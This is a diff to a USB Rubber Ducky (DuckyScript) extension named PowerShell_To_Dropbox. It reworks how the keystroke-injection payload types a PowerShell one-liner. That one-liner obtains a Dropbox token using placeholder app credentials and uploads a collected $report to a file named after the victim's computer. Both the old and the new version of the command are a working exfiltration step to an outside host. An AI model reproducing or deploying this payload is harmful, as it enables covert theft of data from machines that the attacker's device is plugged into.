@@ -8,18 +8,10 @@ EXTENSION PowerShell_To_Dropbox
     REM     For usage instructions look at https://github.com/Who-Is-Julien/Ducky-Utilities/blob/main/PowerShell_To_Dropbox/README.md
 
 
-    DEFINE REFRESH_TOKEN XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
-    DEFINE APP_KEY XXXXXXXXXXXXXXX
-    DEFINE APP_SECRET XXXXXXXXXXXXXXX
+    DEFINE #REFRESH_TOKEN XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
+    DEFINE #APP_KEY XXXXXXXXXXXXXXX
+    DEFINE #APP_SECRET XXXXXXXXXXXXXXX
 
-    STRING Invoke-RestMethod -Uri "https://content.dropboxapi.com/2/files/upload" -Method POST -Headers @{"Authorization" = "Bearer $((Invoke-RestMethod -Uri "https://api.dropboxapi.com/oauth2/token" -Method POST -Headers @{"Content-Type" = "application/x-www-form-urlencoded"} -Body @{grant_type = "refresh_token"; refresh_token = "
-    STRING REFRESH_TOKEN
-    STRING "; client_id = "
-    STRING APP_KEY
-    STRING "; client_secret = "
-    STRING APP_SECRET
-    STRING "}).access_token)"; "Content-Type" = "application/octet-stream"; "Dropbox-API-Arg" = '{ "path": "/reports/' + $env:computername + '.txt", "mode": "add", "autorename": true, "mute": false }'} -Body $report | Out-Null
-    DELAY 500
-    ENTER
+    STRINGLN Invoke-RestMethod -Uri "https://content.dropboxapi.com/2/files/upload" -Method POST -Headers @{ "Authorization" = "Bearer $((Invoke-RestMethod -Uri "https://api.dropboxapi.com/oauth2/token" -Method POST -Headers @{"Content-Type" = "application/x-www-form-urlencoded"} -Body @{grant_type = "refresh_token"; refresh_token = "#REFRESH_TOKEN"; client_id = "#APP_KEY"; client_secret = "#APP_SECRET"}).access_token)"; "Content-Type" = "application/octet-stream"; "Dropbox-API-Arg" = '{ "path": "/reports/' + $env:computername + '.txt", "mode": "add", "autorename": true, "mute": false }' } -Body $report | Out-Null
 
 END_EXTENSION
